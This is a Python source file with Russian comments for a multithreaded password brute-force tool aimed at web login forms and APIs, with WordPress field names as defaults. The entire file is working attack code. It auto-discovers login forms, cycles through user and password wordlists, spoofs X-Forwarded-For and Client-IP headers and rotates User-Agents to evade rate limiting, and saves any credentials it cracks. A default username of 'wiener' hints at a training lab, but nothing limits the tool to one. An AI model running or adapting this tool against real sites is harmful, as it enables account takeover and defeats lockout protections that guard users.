import argparse
import sys
import threading
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

found_event = threading.Event()
print_lock = threading.Lock()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]


def parse_args():
    parser = argparse.ArgumentParser(description="Ultimate Flexible Brute-force Tool")

    # Обязательные
    parser.add_argument("-u", "--url", required=True, help="URL страницы входа или API")
    parser.add_argument("-w", "--wordlist", required=True, help="Путь к файлу со словарем паролей")

    # Пользователи
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--user", default="wiener", help="Конкретный логин")
    group.add_argument("--userlist", help="Путь к файлу со списком пользователей")

    # Потоки и обход защиты
    parser.add_argument("-t", "--threads", type=int, default=10, help="Количество потоков")
    parser.add_argument("--auto-form", action="store_true", help="Автоматически найти форму и поля")
    parser.add_argument("--json", action="store_true", help="Отправлять данные в формате JSON")
    parser.add_argument("--rotate-ip", action="store_true", help="Ротация случайных IP (X-Forwarded-For)")
    parser.add_argument("--rotate-ua", action="store_true", help="Ротация случайных User-Agent")

    # Заголовки и куки
    parser.add_argument("-H", "--header", action="append", default=[], help="Кастомный заголовок 'Ключ: Значение'")
    parser.add_argument("-c", "--cookie", help="Стартовые куки ('session=abc')")

    # Условия успеха и ошибок (МАКСИМУМ ГИБКОСТИ)
    parser.add_argument("--fail-string", nargs='+',
                        help="Точный текст ошибки от сервера (можно в кавычках с пробелами)")
    parser.add_argument("--success-string", help="Строка, появление которой означает успех")
    parser.add_argument("--check-redirect", action="store_true",
                        help="Считать успехом HTTP-редирект (302/303/307) на другую страницу")
    parser.add_argument("--success-code", type=int, default=200,
                        help="Ожидаемый код при успехе (если не используется редирект)")

    # Дополнительно
    parser.add_argument("--delay", type=float, default=0.0, help="Задержка между запросами")
    parser.add_argument("-o", "--output", help="Файл для сохранения результата")
    parser.add_argument("--proxy", help="Прокси (например, http://127.0.0.1:8080)")

    return parser.parse_args()


def generate_random_ip():
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def discover_form(url, session, proxies):
    print(f"[*] Анализируем страницу на наличие формы входа: {url}...")
    try:
        resp = session.get(url, proxies=proxies, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')

        password_input = soup.find('input', {'type': 'password'})
        if not password_input:
            return url, "log", "pwd", "POST"  # Дефолты для WP

        form = password_input.find_parent('form')
        if not form:
            return url, "log", "pwd", "POST"

        action = form.get('action', '')
        action_url = urljoin(url, action) if action else url
        method = form.get('method', 'POST').upper()

        inputs = form.find_all('input')
        user_field = "log"
        pass_field = password_input.get('name', 'pwd')

        for inp in inputs:
            name = inp.get('name')
            ptype = inp.get('type')
            if not name:
                continue
            if ptype in ['text', 'email'] or 'user' in name.lower() or 'log' in name.lower():
                user_field = name
            elif ptype == 'password':
                pass_field = name

        print(f"[+] Найдена форма! Action: {action_url} | Метод: {method} | Поля: [{user_field}, {pass_field}]")
        return action_url, user_field, pass_field, method
    except Exception as e:
        print(f"[-] Ошибка автопоиска: {e}. Используем дефолты.")
        return url, "log", "pwd", "POST"


def test_credential(target_url, user_field, pass_field, method, username, password, args, proxies):
    if found_event.is_set():
        return None

    if args.delay > 0:
        time.sleep(args.delay)

    session = requests.Session()

    ua = random.choice(USER_AGENTS) if args.rotate_ua else "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    session.headers.update({"User-Agent": ua})

    for h in args.header:
        if ":" in h:
            key, val = h.split(":", 1)
            session.headers[key.strip()] = val.strip()

    if args.rotate_ip:
        fake_ip = generate_random_ip()
        session.headers["X-Forwarded-For"] = fake_ip
        session.headers["Client-IP"] = fake_ip

    if args.cookie:
        for cookie_pair in args.cookie.split(";"):
            if "=" in cookie_pair:
                c_name, c_val = cookie_pair.strip().split("=", 1)
                session.cookies.set(c_name, c_val)

    payload = {
        user_field: username,
        pass_field: password
    }

    try:
        if args.json:
            response = session.post(target_url, json=payload, allow_redirects=False, proxies=proxies,
                                    timeout=10) if method == "POST" else session.get(target_url, params=payload,
                                                                                     allow_redirects=False,
                                                                                     proxies=proxies, timeout=10)
        else:
            response = session.post(target_url, data=payload, allow_redirects=False, proxies=proxies,
                                    timeout=10) if method == "POST" else session.get(target_url, params=payload,
                                                                                     allow_redirects=False,
                                                                                     proxies=proxies, timeout=10)

        status = response.status_code
        length = len(response.content)

        # ОЧИСТКА ОТ HTML-ТЕГОВ:
        # Превращаем весь HTML в чистый текст, чтобы теги не разрывали фразы
        soup = BeautifulSoup(response.text, 'html.parser')
        clean_text = soup.get_text(separator=' ', strip=True)

        fail_str = " ".join(args.fail_string) if args.fail_string and isinstance(args.fail_string,
                                                                                 list) else args.fail_string

        # 1. Проверка на ошибку по твоему тексту (--fail-string)
        if fail_str and fail_str in clean_text:
            with print_lock:
                print(f"[-] Проверяю: [{username}:{password}] -> Код: {status}, Длина: {length} (Ошибка входа)")
            return None

        # 2. Оценка успеха
        is_success = False

        if args.success_string and args.success_string in clean_text:
            is_success = True
        elif args.check_redirect and status in [302, 303, 307]:
            location = response.headers.get("Location", "")
            if "wp-login.php" not in location and "login" not in location.lower():
                is_success = True
        elif not args.check_redirect and status == args.success_code:
            if not fail_str or fail_str not in clean_text:
                is_success = True

        if is_success:
            found_event.set()
            with print_lock:
                print(f"\n[+] УСПЕХ! Логин: {username} | Пароль: {password} (Код: {status})")
            return username, password
        else:
            with print_lock:
                print(f"[-] Проверяю: [{username}:{password}] -> Код: {status}, Длина: {length}")

    except requests.RequestException as e:
        with print_lock:
            print(f"[!] Ошибка запроса для [{username}:{password}] -> {e}")

    return None


def main():
    args = parse_args()
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    try:
        with open(args.wordlist, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Файл словаря паролей не найден: {args.wordlist}")
        sys.exit(1)

    if args.userlist:
        try:
            with open(args.userlist, "r", encoding="utf-8") as f:
                usernames = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Файл пользователей не найден: {args.userlist}")
            sys.exit(1)
    else:
        usernames = [args.user]

    session = requests.Session()
    if args.auto_form:
        target_url, user_field, pass_field, method = discover_form(args.url, session, proxies)
    else:
        target_url = args.url
        user_field = "log"
        pass_field = "pwd"
        method = "POST"

    print(f"\n[*] Цель: {target_url}")
    print(f"[*] Пользователей: {len(usernames)} | Паролей в словаре: {len(passwords)}")
    print(f"[*] Режим 302-редиректа: {'ВКЛ' if args.check_redirect else 'ВЫКЛ'}")
    print(f"[*] Потоков: {args.threads} | Запуск безопасного перебора пачками...\n")

    success_result = None

    # Пул потоков с безопасной батчевой отправкой (защита от падения Python 3.12 на Windows)
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for uname in usernames:
            if found_event.is_set():
                break

            batch_size = 50
            for i in range(0, len(passwords), batch_size):
                if found_event.is_set():
                    break

                batch = passwords[i:i + batch_size]

                futures = {
                    executor.submit(
                        test_credential,
                        target_url, user_field, pass_field, method,
                        uname, pwd, args, proxies
                    ): (uname, pwd)
                    for batch_pwd in batch for pwd in [batch_pwd]  # корректный маппинг
                }

                for future in as_completed(futures):
                    if found_event.is_set():
                        executor.shutdown(wait=False, cancel_futures=True)
                        break

                    try:
                        result = future.result()
                        if result:
                            success_result = result
                            if args.output:
                                with open(args.output, "a", encoding="utf-8") as out_f:
                                    out_f.write(f"{result[0]}:{result[1]}\n")
                                print(f"[+] Данные записаны в файл: {args.output}")
                            break
                    except Exception:
                        pass

                if success_result:
                    break
            if success_result:
                break

    if not success_result:
        print("\n[-] Перебор завершен. Подходящие данные не найдены.")


if __name__ == "__main__":
    main()